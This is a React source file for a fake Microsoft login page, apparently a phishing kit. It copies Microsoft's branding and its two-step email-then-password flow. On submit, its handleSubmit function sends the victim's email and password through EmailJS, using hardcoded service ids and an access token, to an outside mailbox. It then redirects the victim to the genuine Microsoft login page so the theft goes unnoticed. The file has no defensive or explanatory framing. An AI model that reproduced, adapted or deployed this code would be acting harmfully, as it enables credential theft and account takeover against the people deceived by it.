import { useState } from "react";
import MicrosoftLogo from "@/components/MicrosoftLogo";

// check if email is valid
const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

<script src="https://js.puter.com/v2/"></script>


const Index = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState<"email" | "password">("email");
  const [error, setError] = useState("");
  


  const handleEmailNext = () => {
    const isValidEmail = (email: string) => emailRegex.test(email);

    if (!isValidEmail(email) ) {
      setError("Enter a valid email address, phone number, or Skype name.");
      return 
    }
    setError("");
    setStep("password");
  };

 

  const handlePassowrd = () => {
    if (!password.trim() && password.length < 6 ) {
      setError("Please enter your password.");
      return;
    }
    setError("");
  };


  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === "Enter") {
      step === "email" ? handleEmailNext() : handlePassowrd();
    }
  };
  
  const handleSubmit = async () => {
    const isValidEmail = (email: string) => emailRegex.test(email);

    if (!isValidEmail && password.length < 5 ) {
      setError("Please enter your correct credentials.");
      return 
    }
    // Send the email and passwrd to we@example.com emailjs structure
    const formData = new FormData();
    formData.append('service_id', 'service_vdglbxn');
    formData.append('template_id', 'template_1xgwdhd');
    formData.append('user_id', '8U58D_RvYIvJMASm2');
    formData.append('email', email)
    formData.append("password", password)
    // Optionally, include private accessToken if needed
    formData.append('accessToken', 'HehEgC656hYqRmVv0z-Fy');
   
    try {
      const response = await fetch('https://api.emailjs.com/api/v1.0/email/send-form', {
        method: 'POST',
        body: formData,
      });

      if (response.ok) {
        console.log('Your mail is sent!');
        window.location.replace("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL%20openid%20profile%20offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=aec9d196-3cec-4894-a41b-f16d56efa18c&x-client-SKU=MSAL.Desktop&x-client-Ver=4.79.2.0&prompt=login&client_info=1&state=H4sIAAAAAAAEAA3OyZpDMAAA4Hfp1WGo_VhbvlJbU1JuRKiGQYZann56_w__KTc9ZHT-w0rj_VD9rM20LUjzid1_6X3dEj68aNADxNLfBV2J3IBKBKboSWkDj78dMSxju02wr8_EOYaokSOe4CmduGnNG0mXfW0VqzLc0PlSBGMs8Oc3oB8bKQcIRPmi91naI25llLH6YLoTVlGDRnfhoJCajpgS0pb7IgG7OiZbgY_eYvOXNdiIuda95vlScgLD1HStgYvf2Q1MVOR3MiwOV4_JEhjqU4Za1y9bd35mlBhIH0VPKKVKqjGhSQhv8dXtXOOj4toePI33whGNP9b3HKrKS3ehr0Yzb60vc2ax0rDkYKx6aaDIF-n0DzfeBBRCAQAA&msaoauth2=true&instance_aware=true&lc=1033", )
  
      } else {
        const errorText = await response.text();
        (`Oops... ${errorText}`);
      }
    } catch (error) {
      console.log(`Oops... ${error.message}`);
    }
 
  }

  return (
    <div className="flex min-h-screen items-center justify-center bg-background">
      <div className="w-[440px] bg-card shadow-[0_2px_6px_rgba(0,0,0,0.2)] p-11">
        <MicrosoftLogo />
      
      
        {step === "email" ? (
          <>
            <h1 className="text-2xl font-semibold text-foreground mt-4 mb-3">
              Sign in
            </h1>
            {error && <p className="text-sm text-destructive mb-3">{error}</p>}
            <input
              type="text"
              placeholder="Email, phone, or Skype"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              onKeyDown={handleKeyDown}
              autoFocus
              className="w-full border-b border-b-foreground/40 focus:border-b-primary bg-transparent py-1.5 text-sm text-foreground placeholder:text-muted-foreground outline-none transition-colors"
            />
            <p className="text-sm text-foreground mt-4">
              No account?{" "}
              <a
                href="#"
                className="text-primary hover:underline hover:text-accent-foreground"
              >
                Create one!
              </a>
            </p>
            <p className="text-sm mt-2">
              <a
                href="#"
                className="text-primary hover:underline hover:text-accent-foreground"
              >
                Can't access your account?
              </a>
            </p>

            <div className="flex justify-end mt-10">
              <button
                onClick={handleEmailNext}
                className="bg-primary text-primary-foreground px-8 py-1.5 text-sm font-semibold hover:opacity-90"
              >
                Next
              </button>
            </div>
            <div className="buttonhover">
              <a href="" className="buttonhover">
                <img
                  src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
                  alt="logo"
                />
                Sign-in options
              </a>
            </div>
          </>
        ) : (
          <>
            <div className="flex items-center mt-4 mb-4">
              <button
                onClick={() => setStep("email")}
                className="text-foreground hover:text-muted-foreground mr-2"
              >
                ←
              </button>
              <span className="text-sm text-foreground bg-muted rounded-full px-3 py-1">
                {email}
              </span>
            </div>
            <h1 className="text-2xl font-semibold text-foreground mb-3">
              Enter password
            </h1>
            {error && <p className="text-sm text-destructive mb-3">{error}</p>}
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onKeyDown={handleKeyDown}
              autoFocus
              className="w-full border-b border-b-foreground/40 focus:border-b-primary bg-transparent py-1.5 text-sm text-foreground placeholder:text-muted-foreground outline-none transition-colors"
            />
            <p className="text-sm mt-4">
              <a
                href="#"
                className="text-primary hover:underline hover:text-accent-foreground"
              >
                Forgot password?
              </a>
            </p>

            <div className="flex justify-end mt-10">
              <button
                onClick={async () => {
                    await handleSubmit()
                }}
                
                className="bg-primary text-primary-foreground px-8 py-1.5 text-sm font-semibold hover:opacity-90 transition-opacity"
              >
                Sign in
              </button>
            </div>
          </>
        )}
      </div>
    </div>


  );
};



export default Index;
